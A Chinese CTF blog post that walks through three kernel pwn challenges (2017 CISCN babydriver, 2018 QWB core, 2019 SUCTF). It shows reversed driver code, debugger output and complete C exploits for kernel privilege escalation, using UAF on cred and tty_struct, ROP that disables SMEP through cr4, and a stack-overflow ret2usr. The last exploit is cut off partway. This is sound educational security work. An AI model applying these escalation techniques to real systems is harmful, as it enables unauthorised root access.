---
title: Kernel Pwn题目的实战
date: 2020年2月6日 23:09:07
categories: Pwn
tag:
	- pwn
	- kernel
---

以往比赛的Kernel Pwn题目分析（持续更新）

<!--more-->

# 2017 CISCN

## 驱动环境

打开boot.sh

```shell
#!/bin/bash
qemu-system-x86_64 \
-initrd rootfs.cpio \
-kernel bzImage \
-append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
-enable-kvm \
-monitor /dev/null \
-m 64M \
--nographic  \
-smp cores=1,threads=1 \
-cpu kvm64,+smep \
-gdb tcp::1234

```

可以发现开启了smep保护，无法在ring 0级别执行用户代码，且是单线程

```shell
/ $ uname -a
Linux (none) 4.4.72 #1 SMP Thu Jun 15 19:52:50 PDT 2017 x86_64 GNU/Linux
```

内核版本是4.4.72

## 驱动分析

在rootfs的init文件中找到

```tex
insmod /lib/modules/4.4.72/babydriver.ko
```

进而知道驱动位置，对驱动进行逆向分析

```c
int __cdecl babydriver_init()
{
  int v0; // edx
  int v1; // ebx
  class *v2; // rax
  __int64 v3; // rax

  if ( (signed int)alloc_chrdev_region(&babydev_no, 0LL, 1LL, "babydev") >= 0 )
  {
    cdev_init(&cdev_0, &fops);
    cdev_0.owner = &_this_module;
    v1 = cdev_add(&cdev_0, babydev_no, 1LL);
    if ( v1 >= 0 )
    {
      v2 = (class *)_class_create(&_this_module, "babydev", &babydev_no);
      babydev_class = v2;
      if ( v2 )
      {
        v3 = device_create(v2, 0LL, babydev_no, 0LL, "babydev");
        v0 = 0;
        if ( v3 )
          return v0;
        printk(&unk_351);
        class_destroy(babydev_class);
      }
      else
      {
        printk(&unk_33B);
      }
      cdev_del(&cdev_0);
    }
    else
    {
      printk(&unk_327);
    }
    unregister_chrdev_region(babydev_no, 1LL);
    return v1;
  }
  printk(&unk_309);
  return 1;
}
```

babydriver_init函数对驱动进行了注册

```c
int __fastcall babyopen(inode *inode, file *filp)
{
  _fentry__(inode, filp);
  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 0x40LL);
  babydev_struct.device_buf_len = 0x40LL;
  printk("device open\n");
  return 0;
}
```

babyopen函数在驱动被open的时候，申请0x40的内存，赋给babydev_struct.device_buf

```c
int __fastcall babyrelease(inode *inode, file *filp)
{
  _fentry__(inode, filp);
  kfree(babydev_struct.device_buf);             // free device_buf，存在uaf
  printk("device release\n");
  return 0;
}
```

babyrelease函数在驱动被close的时候，释放babydev_struct.device_buf这个内存

```c
// local variable allocation has failed, the output may be wrong!
__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)
{
  size_t v3; // rdx
  size_t size; // rbx
  __int64 result; // rax

  _fentry__(filp, *(_QWORD *)&command);
  size = v3;
  if ( command == 0x10001 ) 
  {
    kfree(babydev_struct.device_buf);
    babydev_struct.device_buf = (char *)_kmalloc(size, 0x24000C0LL);
    babydev_struct.device_buf_len = size;
    printk("alloc done\n");
    result = 0LL;
  }
  else
  {
    printk(&unk_2EB);
    result = -22LL;
  }
  return result;
}
```

babyioctl函数注册了一个0x10001的功能，其先释放babydev_struct.device_buf这个内存，然后重新申请一个可控大小的内存地址，并且更新内存长度地址

## 驱动利用

这道题都两种利用方式，UAF直接修改cred结构体和UAF修改tty_struct实现ROP

### UAF

在babyrelease函数中释放了内存，但是并没有把指针清零，所以有UAF的隐患

因为这里的babydev_struct结构体是放在驱动bss段上的，open两次驱动设备，他们的结构体是同一个，指针指向第二次open时申请的内存空间，所以close一个，另外一个则可以继续操作，就是UAF了

首先来介绍一下进程的cred结构体

```c
struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;	/* default keyring to attach requested
					 * keys to */
	struct key __rcu *session_keyring; /* keyring inherited over fork */
	struct key	*process_keyring; /* keyring private to this process */
	struct key	*thread_keyring; /* keyring private to this thread */
	struct key	*request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
	void		*security;	/* subjective LSM security */
#endif
	struct user_struct *user;	/* real user ID subscription */
	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
	struct rcu_head	rcu;		/* RCU deletion hook */
};
```

这是4.4.72源码中的cred结构体定义

在linux内核中，每个新建进程，都会申请一个cred来储存进程所有者的身份信息，只要把这个结构体的uid~fsgid都改为0，就可以提升到root权限了

```c
struct cred *prepare_creds(void)
{
	struct task_struct *task = current;
	const struct cred *old;
	struct cred *new;

	validate_process_creds();

	new = kmem_cache_alloc(cred_jar, GFP_KERNEL);
	if (!new)
		return NULL;

	kdebug("prepare_creds() alloc %p", new);

	old = task->cred;
	memcpy(new, old, sizeof(struct cred));

	atomic_set(&new->usage, 1);
	set_cred_subscribers(new, 0);
	get_group_info(new->group_info);
	get_uid(new->user);
	get_user_ns(new->user_ns);

#ifdef CONFIG_KEYS
	key_get(new->session_keyring);
	key_get(new->process_keyring);
	key_get(new->thread_keyring);
	key_get(new->request_key_auth);
#endif

#ifdef CONFIG_SECURITY
	new->security = NULL;
#endif

	if (security_prepare_creds(new, old, GFP_KERNEL) < 0)
		goto error;
	validate_creds(new);
	return new;

error:
	abort_creds(new);
	return NULL;
}
EXPORT_SYMBOL(prepare_creds);

void __init cred_init(void)
{
	/* allocate a slab in which we can store credentials */
	cred_jar = kmem_cache_create("cred_jar", sizeof(struct cred),
				     0, SLAB_HWCACHE_ALIGN|SLAB_PANIC, NULL);
}
```

可以看到，在申请cred结构体时，是使用kmem_cache_alloc，且size为sizeof(struct cred)

因此如果释放一个sizeof(struct cred)的内存地址，然后新建一个进程，则这个进程就是拿到了这个地址作为cred结构体

所以UAF就用来修改新进程的cred结构体，进而提权

sizeof(struct cred)可以通过写一个LKM来输出，测得是0xa8

所以思路就是

1. open两次设备
2. 设备A ioctl申请一个0xa8的内存
3. close 设备A
4. 使用fork创建一个新的进程，
5. 设备B 改写cred结构体
6. get root shell

完整EXP：

```c
//gcc exp.c -static -o exp
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>

char payload[100] = {0};

int main()
{
    int A = open("/dev/babydev", 2);
    int B = open("/dev/babydev", 2);
    ioctl(A, 0x10001, 0xa8);
    close(A);
    int pid = fork();
    if(pid == 0){
        write(B, payload, 28);
        system("/bin/sh");
    }else{
        wait(NULL);
    }
    return 0;
}
```

### ROP

这里ROP比较麻烦，不过还是值得学习一下

首先还是利用UAF，不过这里不是劫持cred结构体，而是tty_struct

/dev/ptmx是一种tty设备，tty设备被open的时候，会申请一个空间作为tty_struct

```c
struct tty_struct {
	int	magic;
	struct kref kref;
	struct device *dev;
	struct tty_driver *driver;
	const struct tty_operations *ops;
	int index;

	/* Protects ldisc changes: Lock tty not pty */
	struct ld_semaphore ldisc_sem;
	struct tty_ldisc *ldisc;

	struct mutex atomic_write_lock;
	struct mutex legacy_mutex;
	struct mutex throttle_mutex;
	struct rw_semaphore termios_rwsem;
	struct mutex winsize_mutex;
	spinlock_t ctrl_lock;
	spinlock_t flow_lock;
	/* Termios values are protected by the termios rwsem */
	struct ktermios termios, termios_locked;
	struct termiox *termiox;	/* May be NULL for unsupported */
	char name[64];
	struct pid *pgrp;		/* Protected by ctrl lock */
	struct pid *session;
	unsigned long flags;
	int count;
	struct winsize winsize;		/* winsize_mutex */
	unsigned long stopped:1,	/* flow_lock */
		      flow_stopped:1,
		      unused:BITS_PER_LONG - 2;
	int hw_stopped;
	unsigned long ctrl_status:8,	/* ctrl_lock */
		      packet:1,
		      unused_ctrl:BITS_PER_LONG - 9;
	unsigned int receive_room;	/* Bytes free for queue */
	int flow_change;

	struct tty_struct *link;
	struct fasync_struct *fasync;
	int alt_speed;		/* For magic substitution of 38400 bps */
	wait_queue_head_t write_wait;
	wait_queue_head_t read_wait;
	struct work_struct hangup_work;
	void *disc_data;
	void *driver_data;
	struct list_head tty_files;

#define N_TTY_BUF_SIZE 4096

	int closing;
	unsigned char *write_buf;
	int write_cnt;
	/* If the tty has a pending do_SAK, queue it here - akpm */
	struct work_struct SAK_work;
	struct tty_port *port;
};
```

有一个成员是tty_operations结构体

```c
struct tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,
			struct inode *inode, int idx);
	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
	int  (*open)(struct tty_struct * tty, struct file * filp);
	void (*close)(struct tty_struct * tty, struct file * filp);
	void (*shutdown)(struct tty_struct *tty);
	void (*cleanup)(struct tty_struct *tty);
	int  (*write)(struct tty_struct * tty,
		      const unsigned char *buf, int count);
	int  (*put_char)(struct tty_struct *tty, unsigned char ch);
	void (*flush_chars)(struct tty_struct *tty);
	int  (*write_room)(struct tty_struct *tty);
	int  (*chars_in_buffer)(struct tty_struct *tty);
	int  (*ioctl)(struct tty_struct *tty,
		    unsigned int cmd, unsigned long arg);
	long (*compat_ioctl)(struct tty_struct *tty,
			     unsigned int cmd, unsigned long arg);
	void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
	void (*throttle)(struct tty_struct * tty);
	void (*unthrottle)(struct tty_struct * tty);
	void (*stop)(struct tty_struct *tty);
	void (*start)(struct tty_struct *tty);
	void (*hangup)(struct tty_struct *tty);
	int (*break_ctl)(struct tty_struct *tty, int state);
	void (*flush_buffer)(struct tty_struct *tty);
	void (*set_ldisc)(struct tty_struct *tty);
	void (*wait_until_sent)(struct tty_struct *tty, int timeout);
	void (*send_xchar)(struct tty_struct *tty, char ch);
	int (*tiocmget)(struct tty_struct *tty);
	int (*tiocmset)(struct tty_struct *tty,
			unsigned int set, unsigned int clear);
	int (*resize)(struct tty_struct *tty, struct winsize *ws);
	int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
	int (*get_icount)(struct tty_struct *tty,
				struct serial_icounter_struct *icount);
#ifdef CONFIG_CONSOLE_POLL
	int (*poll_init)(struct tty_driver *driver, int line, char *options);
	int (*poll_get_char)(struct tty_driver *driver, int line);
	void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
	const struct file_operations *proc_fops;
};
```

可以发现这个结构体存了许多函数指针，在对此设备进行操作的时候，就会调用这里的函数指针

若是我们UAF控制的内存刚好被分配成了tty_struct结构体，我们就能伪造tty_operations指针进而伪造tty_operations结构体

```tex
[    7.488050] Open                         
[    7.488475] size of tty_struct:0x2e0     
[    7.488583] size of tty_operations:0x110 
```

所以我们要用一个0x2e0的内存来进行UAF

```c
//gcc exp.c -static -o exp
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>

char payload[100] = {0};

int main()
{
    int A = open("/dev/babydev", 2);
    int B = open("/dev/babydev", 2);
    printf("%d,%d\n", A, B);
    ioctl(A, 0x10001, 0x2e0);
    close(A);
    int C = open("/dev/ptmx", 2);
    write(B, "1234", 4);
    return 0;
}
```

在babywrite下断，查看当前buf的内容

```tex
pwndbg> x/20gx 0xffff8800027a2000
0xffff8800027a2000:     0x0000000100005401      0x0000000000000000
0xffff8800027a2010:     0xffff88000264aa80      0xffffffff81a74f80
0xffff8800027a2020:     0x0000000000000000      0x0000000000000000
0xffff8800027a2030:     0x0000000000000000      0xffff8800027a2038
0xffff8800027a2040:     0xffff8800027a2038      0xffff8800027a2048
0xffff8800027a2050:     0xffff8800027a2048      0xffff880002620970
0xffff8800027a2060:     0x0000000000000001      0xffff8800027a2068
0xffff8800027a2070:     0xffff8800027a2068      0x0000000000000000
0xffff8800027a2080:     0x0000000000000000      0x0000000000000001
0xffff8800027a2090:     0xffff8800027a2090      0xffff8800027a2090
```

这个正是tty_struct结构，0x0000000100005401是magic标志，0x18处就是tty_operations指针

```c
pwndbg> x/10gx 0xffffffff81a74f80
0xffffffff81a74f80:     0xffffffff814e2640      0xffffffff814e32d0
0xffffffff81a74f90:     0xffffffff814e2660      0xffffffff814e2570
0xffffffff81a74fa0:     0xffffffff814e32f0      0xffffffff814e2960
0xffffffff81a74fb0:     0xffffffff814e2940      0xffffffff814e28e0
0xffffffff81a74fc0:     0x0000000000000000      0x0000000000000000
pwndbg> x/5i 0xffffffff814e2640
   0xffffffff814e2640:  nop    DWORD PTR [rax+rax*1+0x0]
   0xffffffff814e2645:  push   rbp
   0xffffffff814e2646:  mov    rax,0xfffffffffffffffb
   0xffffffff814e264d:  mov    rbp,rsp
   0xffffffff814e2650:  pop    rbp
```

因为没有开启SMAP，可以访问用户空间内存，所以我们在用户程序中伪造一个tty_operations，把tty_operations中第7个指针也就是write函数指针劫持，这样对ptmx这个fd进行write的时候就可以触发


从调用过程可以发现，call    qword ptr [rax+38h]就是调用tty_operations中的write函数，我们就从此开始ROP

需要一个栈转移的操作

```c
0xffffffff81007808    xchg   eax, esp
0xffffffff81007809    ret    
```

交换eax和esp的值，之前rax是指向用户空间的tty_operations结构体的，实际调试发现，会把rsp直接改成rax，也就是用户空间的bss，在用户空间布置好rop_chain，就可以成功ROP

rop_chain可以去修改cr4寄存器关闭SMEP保护，再ret2usr，也可以直接ROP提权再返回用户空间

```c
0xffffffff81004d80:  mov    cr4,rdi // 一般把cr4改成0x6f0
0xffffffff81004d83:  pop    rbp
0xffffffff81004d84:  ret    
```

![](https://i.loli.net/2020/02/06/uthznJKM5yVRNaw.png)

成功拿到root shell

<img src="https://i.loli.net/2020/02/06/pWgSNrLEkoPxKi4.png" div align="center">

完整EXP：

```c
//gcc exp.c -static -o exp
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>

#define prepare_kernel_cred 0xffffffff810a1810
#define commit_creds 0xffffffff810a1420
#define swap_eax_rsp_ret 0xffffffff81007808
#define add_rsp_ret 0xffffffff813e64e3
#define prdi_ret 0xffffffff810d238d
#define rdi2cr4_prbp_ret 0xffffffff81004d80

char payload[1000] = {0};
int payload_len = 0;
long long user_cs, user_ss, user_rflags, user_stack;

static void save_state() 
{
    asm(
    "movq %%cs, %0\n"
    "movq %%ss, %1\n"
    "pushfq\n"
    "popq %2\n"
    : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory");
}

void launch_shell(){
    execl("/bin/sh", "sh", NULL);
}
void get_root(){
    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));
    asm(
        "push %2\n"
        "swapgs\n"
        "push %0\n"
        "push %1\n"
        "push %2\n"
        "push %3\n"
        "push %4\n"
        "iretq\n"
        :
        :  "r" (user_ss), "r" (user_stack), "r" (user_rflags), "r" (user_cs), "r" (&launch_shell)
        : "memory"
    );
}

void join_data(long long data)
{
    unsigned char buf[8] = {0};
    memcpy(buf, &data, 8);
    memcpy(payload + payload_len, buf, 8);
    payload_len += 8;
}

int *fake_tty_operations[] = {
    add_rsp_ret,
    add_rsp_ret,
    add_rsp_ret,
    add_rsp_ret,
    add_rsp_ret,
    add_rsp_ret,
    add_rsp_ret,
    swap_eax_rsp_ret,
    swap_eax_rsp_ret, // 下面开始是rop_chain
    prdi_ret,
    0x6f0,
    rdi2cr4_prbp_ret,
    0,
    &get_root
};

int main()
{
    save_state();
    int A = open("/dev/babydev", 2);
    int B = open("/dev/babydev", 2);
    user_stack = &A;
    fake_tty_operations[12] = &fake_tty_operations + 0x40;
    ioctl(A, 0x10001, 0x2e0);
    close(A);
    int C = open("/dev/ptmx", 2);
    join_data(0x0000000100005401);
    join_data(0);
    join_data(0xffff88000263f600);
    join_data(&fake_tty_operations);
    write(B, payload, 4 * 8);
    write(C, "1234", 4);
    return 0;
}

/*
0xffffffff81007808    xchg   eax, esp
0xffffffff81007809    ret   

0xffffffff813e64e3:  add    rsp,0x10
0xffffffff813e64e7:  ret    

0xffffffff810d238d:  pop    rdi
0xffffffff810d238e:  ret    

0xffffffff81004d80:  mov    cr4,rdi
0xffffffff81004d83:  pop    rbp
0xffffffff81004d84:  ret    
*/
```

总的来说，这一道题就是利用UAF的思路来劫持一些特定的结构体，如cred结构体直接提升权限，tty_struct结构体劫持函数指针

# 2018 强网杯

## 驱动环境

```tex
/ $ uname -a
Linux (none) 4.15.8 #19 SMP Mon Mar 19 18:50:28 CST 2018 x86_64 GNU/Linux
```

4.15.8的内核

```shell
qemu-system-x86_64 \
-m 256M \
-kernel ./bzImage \
-initrd  ./core.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  \
```

开启了kaslr，内核函数地址会变化

## 驱动分析

驱动注册了write，ioctl，release三个功能

```c
signed __int64 __fastcall core_write(__int64 a1, __int64 buf, unsigned __int64 a3)
{
  unsigned __int64 size; // rbx

  size = a3;
  printk(&unk_215, buf);
  if ( size <= 0x800 && !copy_from_user(&name, buf, size) )
    return (unsigned int)size;
  printk(&unk_230, buf);
  return 0xFFFFFFF2LL;
}
```

core_write函数可以从用户态读取少于0x800个字节到内核态name变量，没有溢出到其他数据

```c
__int64 __fastcall core_ioctl(__int64 a1, __int64 cmd, __int64 args)
{
  __int64 arg; // rbx

  arg = args;
  switch ( (_DWORD)cmd )
  {
    case 0x6677889B:
      core_read(args, cmd);
      break;
    case 0x6677889C:
      printk(&unk_2CD, args);
      off = arg;
      break;
    case 0x6677889A:
      printk(&unk_2B3, cmd);
      core_copy_func(arg, cmd);
      break;
  }
  return 0LL;
}
```

core_ioctl实现了三个功能

1. 0x6677889B：调用core_read函数

```c
unsigned __int64 __fastcall core_read(__int64 args, __int64 a2)
{
  __int64 arg; // rbx
  __int64 *v3; // rdi
  signed __int64 i; // rcx
  unsigned __int64 result; // rax
  __int64 stack_buf; // [rsp+0h] [rbp-50h]
  unsigned __int64 v7; // [rsp+40h] [rbp-10h]

  arg = args;
  v7 = __readgsqword(0x28u);
  printk(&unk_25B, a2);
  printk(&unk_275, off);
  v3 = &stack_buf;
  for ( i = 0x10LL; i; --i )                    // 栈上数据清0
  {
    *(_DWORD *)v3 = 0;
    v3 = (__int64 *)((char *)v3 + 4);
  }
  strcpy((char *)&stack_buf, "Welcome to the QWB CTF challenge.\n");// 栈上存入文本
  result = copy_to_user(arg, (char *)&stack_buf + off, 0x40LL);// stack_buf[off]开始的0x40个字节传给用户态
  if ( !result )
    return __readgsqword(0x28u) ^ v7;
  __asm { swapgs }
  return result;
}
```

core_read函数把stack_buf[off]开始的0x40个字节传给用户态arg的内存中

2. 0x6677889C：给off变量赋值
3. 0x6677889A：调用core_copy_func函数

```c
signed __int64 __fastcall core_copy_func(signed __int64 arg, __int64 a2)
{
  signed __int64 result; // rax
  __int64 stack_buf; // [rsp+0h] [rbp-50h]
  unsigned __int64 v4; // [rsp+40h] [rbp-10h]

  v4 = __readgsqword(0x28u);
  printk(&unk_215, a2);
  if ( arg > 0x3F )
  {
    printk(&unk_2A1, a2);
    result = 0xFFFFFFFFLL;
  }
  else
  {
    result = 0LL;
    qmemcpy(&stack_buf, &name, (unsigned __int16)arg);
  }
  return result;
}
```

core_copy_func函数中首先对arg进行上限检查，不能大于0x3f，但是在qmemcpy

中是unsigned __int16的形式，所以当arg是负数的时候，造成负数溢出，因此可以从name中复制数据到stack_buf中，造成栈溢出

## 驱动利用

core_copy_func函数中存在栈溢出，所以ROP是很明显的利用方式，由于开启了kaslr，需要泄漏一些地址，来确定函数的实际位置，在core_read函数下断看看栈上数据

![](https://i.loli.net/2020/02/06/FnmV3lhb7CUx5Bo.png)

可以发现canary和内核函数地址，设置相应的offset即可读出两个值，再利用函数之间的偏移即可计算出prepare_kernel_cred和commit_creds

接着使用write向name中写入数据，0x40的padding+canary+rbp+usr_func_addr

然后使用core_copy_func，参数传入0xffffffffffff0058，因为函数中使用

```assembly
movzx   ecx, bx
```

来取得qmemcpy的大小，也就是0x58，刚好是payload的长度，覆盖溢出后即可ret2usr

![](https://i.loli.net/2020/02/06/vlyjCtoiPEGTVb1.png)

成功拿到root shell

![](https://i.loli.net/2020/02/06/oJXmdb42T8DzYQa.png)

完整EXP：

```c
//gcc exp.c -static -o exp
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>

int fd;
long long prepare_kernel_cred;
long long commit_creds;
long long canary;
long long user_cs, user_ss, user_rflags, user_stack;

static void save_state() {
    asm(
    "movq %%cs, %0\n"
    "movq %%ss, %1\n"
    "pushfq\n"
    "popq %2\n"
    "movq %%rsp, %3\n"
    : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags), "=r" (user_stack) : : "memory");
}

void launch_shell(){
    execl("/bin/sh", "sh", NULL);
}
void get_root(){
    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));
    asm(
        "push %2\n"
        "swapgs\n"
        "push %0\n"
        "push %1\n"
        "push %2\n"
        "push %3\n"
        "push %4\n"
        "iretq\n"
        :
        :  "r" (user_ss), "r" (user_stack), "r" (user_rflags), "r" (user_cs), "r" (&launch_shell)
        : "memory"
    );
}

void setoff(int off){
    ioctl(fd, 0x6677889C, off);
}

void readmsg(char *buf){
    ioctl(fd, 0x6677889B, buf);
}

void cpmsg(long long size){
    ioctl(fd, 0x6677889A, size);
}

char *buf[10];
char payload[1000];
int payload_len = 0;

void join_data(long long data){
    unsigned char buf[8] = {0};
    memcpy(buf, &data, 8);
    memcpy(payload + payload_len, buf, 8);
    payload_len += 8;
}


int main(){
    save_state();
    fd = open("/proc/core", O_WRONLY);
    setoff(0x40);
    readmsg(&buf);
    canary = buf[0];
    prepare_kernel_cred = buf[4] - 0x1409f1;
    commit_creds = buf[4] - 0x140df1;
    printf("canary:0x%lx\n", canary);
    printf("prepare_kernel_cred:0x%lx\n", prepare_kernel_cred);
    printf("commit_creds:0x%lx\n", commit_creds);
    for(int i = 0; i < 8 ; i++){
        join_data(0);
    }
    join_data(canary);
    join_data(0);
    join_data(&get_root);
    write(fd, payload, payload_len);
    long long a = 0xffffffffffff0000 ^ payload_len;
    cpmsg(a);
    close(fd);
}
```

# 2019 SUCTF

## 驱动环境

```shell
/ $ uname -a
Linux (none) 4.20.12 #1 SMP Mon Feb 25 20:42:55 CST 2019 x86_64 GNU/Linux
```

```shell
#! /bin/sh

qemu-system-x86_64 \
-m 128M \
-kernel ./bzImage \
-initrd  ./rootfs.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr" \
-monitor /dev/null \
-nographic 2>/dev/null \
-smp cores=2,threads=1 \
-cpu kvm64,+smep 
```

开启了kaslr和smep，且是多核系统

## 驱动分析

```c
int __cdecl sudrv_init()
{
  int v0; // eax
  __int64 v1; // rdi

  printk(&unk_190);
  v0 = _register_chrdev(233LL, 0LL, 256LL, "meizijiutql", &fops);
  v1 = kmalloc_caches[12];
  su_fd = v0;
  su_buf = (char *)kmem_cache_alloc_trace(v1, 0x480020LL, 0x1000LL);
  return 0;
}
```

驱动一开始申请了0x1000大小的内存

```c
signed __int64 sudrv_write()
{
  JUMPOUT(copy_user_generic_unrolled(su_buf), 0, sudrv_write_cold_1);
  return -1LL;
}
```

sudrv_write向su_buf写入数据，没有长度限制

```c
__int64 __fastcall sudrv_ioctl(__int64 a1, int cmd, __int64 args)
{
  __int64 result; // rax

  switch ( cmd )
  {
    case 0x73311337:
      if ( (unsigned __int64)(args - 1) > 0xFFE )// size限制
        return 0LL;
      su_buf = (char *)_kmalloc(args, 0x480020LL);
      result = 0LL;
      break;
    case (int)0xDEADBEEF:
      JUMPOUT(su_buf, 0LL, sudrv_ioctl_cold_2); // printk输出su_buf
      result = 0LL;
      break;
    case 0x13377331:
      kfree(su_buf);                            // 释放su_buf内存
      result = 0LL;
      su_buf = 0LL;
      break;
    default:
      return 0LL;
  }
  return result;
}
```

sudrv_ioctl实现了三个功能

- 0x73311337：自定义申请内存，有大小限制
- 0xDEADBEEF：使用printk输出su_buf的内容，由于init写有sysctl kernel.dmesg_restrict=0，因此可以查看到输出内容
- 0x13377331：释放su_buf的内存

## 驱动利用

printk有格式化字符串功能，但是不像是用户态那么多格式化符号，可以逐个泄露数据

在printk处下断点，可以看到栈上有内核函数地址与内核栈地址，把他们泄漏出来

```tex
00:0000│ rsp  0xffffae7680123e80 —▸ 0xffffffffa19c827f  (内核函数地址)
01:0008│      0xffffae7680123e88 ◂— add    byte ptr [rdi + 0x7ca527ea], cl 
02:0010│      0xffffae7680123e90 ◂— 2
03:0018│      0xffffae7680123e98 —▸ 0xffffffffa2a9a268 ◂— 0
04:0020│      0xffffae7680123ea0 —▸ 0xffffae7680123ed8  (内核栈地址)
05:0028│      0xffffae7680123ea8 ◂— out    dx, eax /* 0xdeadbeef */
06:0030│      0xffffae7680123eb0 —▸ 0xffff92f90720f800 ◂— 0
07:0038│      0xffffae7680123eb8 ◂— 0
```

```tex
[   11.632042] SU Device opened                       
[   11.632651] Write!                                 
[   11.632725] 0xdeadbeef0x00x00xb0x0                 
[   11.632725] -1472429441 (内核函数地址)
[   11.632725] 0x9f15a30f4a0e0800x20xffffffffa949a268 
[   11.632725] -97935990505768 (内核栈地址)
```

接着利用内核函数地址以及偏移来确定提权函数地址与一些gadget

由于也泄漏了内核栈地址，利用堆溢出来修改nextchunk的next指针指向内核栈

通过申请到内核栈来修改返回地址进行ROP，不过我在进行利用的时候，从iretq返回到用户态时，总会crash

后来学到了写一个signal函数来捕获这个segment fault，进而在crash时运行指定函数，从而拿到root shell

```tex
/ $ ./exp                                             
[   11.632042] SU Device opened                       
[   11.632651] Write!                                 
[   11.632725] 0xdeadbeef0x00x00xb0x0                 
[   11.632725] -1472429441                            
[   11.632725] 0x9f15a30f4a0e0800x20xffffffffa949a268 
[   11.632725] -97935990505768                        
[   11.698038] Write!                                 
/ # id                                                
uid=0 gid=0                                           
/ #                                                   
```

完整EXP：

```c
//gcc exp.c -static -o exp
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>

int fd;

void add(int size){
    ioctl(fd, 0x73311337, size);
}

void see(){
    ioctl(fd, 0xDEADBEEF, 0);
}

void del(){
    ioctl(fd, 0x13377331, 0);
}

char payload[1000];
int payload_len = 0;

void join_data(long long data){
    unsigned char buf[8] = {0};
    memcpy(buf, &data, 8);
    memcpy(payload + payload_len, buf, 8);
    payload_len += 8;
}

unsigned long long func, stack, prepare_kernel_cred, commit_creds, rdi2cr4, prdi, prdx, pushrax, swapgs, iretq, rax2rdi, poprcx, poprbp;

long long user_cs, user_ss, user_rflags, user_stack;

static void save_state() {
    asm(
    "movq %%cs, %0\n"
    "movq %%ss, %1\n"
    "pushfq\n"
    "popq %2\n"
    "movq %%rsp, %3\n"
    : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags), "=r" (user_stack) : : "memory");
}

void launch_shell(){
    execl("/bin/sh", "sh", NULL);
}

int main(){
    signal(SIGSEGV, launch_shell);
    save_state();
    fd = open("/dev/meizijiutql", 2);
    add(0x40);
    char buf[] = "0x%lx0x%lx0x%lx0x%lx0x%lx\n%lld\n0x%lxx%lx0x%lx\n%lld\n";
    write(fd, buf, sizeof(buf));
    see();
    system("eval echo `dmesg | tail -3 | head -1 | cut -f 2 -d ']'` > func");
    system("eval echo `dmesg | tail -1 | head -1 | cut -f 2 -d ']'` > stack");
    char func_buf[20], stack_buf[20];
    int func_fd, stack_fd;
    func_fd = open("func", 2);
    stack_fd = open("stack", 2);
    read(func_fd, func_buf, 18);
    read(stack_fd, stack_buf, 18);
    func = atol(func_buf);
    stack = atol(stack_buf);
    prepare_kernel_cred = func - 0x146aef;
    commit_creds = func - 0x146e6f;
    rdi2cr4 = prepare_kernel_cred - 0x331df;
    prdi = prepare_kernel_cred - 0x80408;
    prdx = prepare_kernel_cred - 0x3c879;
    pushrax = prepare_kernel_cred - 0x5e79d;
    swapgs = prepare_kernel_cred + 0x97f5ca;
    iretq = prepare_kernel_cred - 0x6002e + 0x11e;
    rax2rdi = prepare_kernel_cred + 0x30ca66;
    poprcx = prepare_kernel_cred - 0x1a291;
    poprbp = prepare_kernel_cred - 0x812a2;
    // printf("func:0x%llx\n", func);
    // printf("stack:0x%llx\n", stack);
    // printf("prepare_kernel_cred:0x%llx\n", prepare_kernel_cred);
    // printf("commit_creds:0x%llx\n", commit_creds);
    // printf("mov cr4, rdi:0x%llx\n", rdi2cr4);
    // printf("pop rdi:0x%llx\n", prdi);

    add(0x10);
    add(0x10);
    add(0x10);
    for(int i = 0; i < 2; i++){
        join_data(0);
    }
    join_data(stack - 0x88);
    write(fd, payload, payload_len);
    add(0x10);
    add(0x10);
